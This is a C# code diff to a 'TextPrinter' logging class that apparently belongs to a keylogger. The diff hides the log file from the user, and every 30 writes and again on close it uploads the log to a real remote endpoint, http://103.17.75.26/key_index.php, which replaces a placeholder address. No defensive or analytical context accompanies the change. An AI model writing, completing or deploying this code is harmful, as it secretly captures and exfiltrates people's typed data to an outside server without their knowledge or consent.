@@ -15,6 +15,8 @@ public class TextPrinter
             System.IO.File.WriteAllText(path, "Start logging \n");
             textWriter = new StreamWriter(path, true);
             textWriter.WriteLine();
+
+            File.SetAttributes(path, FileAttributes.Hidden);
         }
         else if (File.Exists(path))
         {
@@ -22,11 +24,28 @@ public class TextPrinter
         }
     }
 
-    public static void write(string str)
+    public static void print(string str)
     {
         textWriter.Write(str);
+        checking();
+    }
+
+    public static void printLine(string str)
+    {
+        textWriter.WriteLine(str);
+        checking();
+    }
+
+    public static void printLine()
+    {
+        textWriter.WriteLine();
+        checking();
+    }
+
+    private static void checking()
+    {
         count++;
-        if (count == 20)
+        if (count == 30)
         {
             textWriter.WriteLine();
             textWriter.Close();
@@ -34,7 +53,7 @@ public class TextPrinter
             count = 0;
             System.Net.WebClient Client = new System.Net.WebClient();
             Client.Headers.Add("Content-Type", "binary/octet-stream");
-            byte[] result = Client.UploadFile("Your address of PHP file", "POST",
+            byte[] result = Client.UploadFile("http://103.17.75.26/key_index.php", "POST",
                                               path);
             string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
 
@@ -47,7 +66,7 @@ public class TextPrinter
         textWriter.Close();
         System.Net.WebClient Client = new System.Net.WebClient();
         Client.Headers.Add("Content-Type", "binary/octet-stream");
-        byte[] result = Client.UploadFile("Your address of php file", "POST",
+        byte[] result = Client.UploadFile("http://103.17.75.26/key_index.php", "POST",
                                           path);
     }
 }
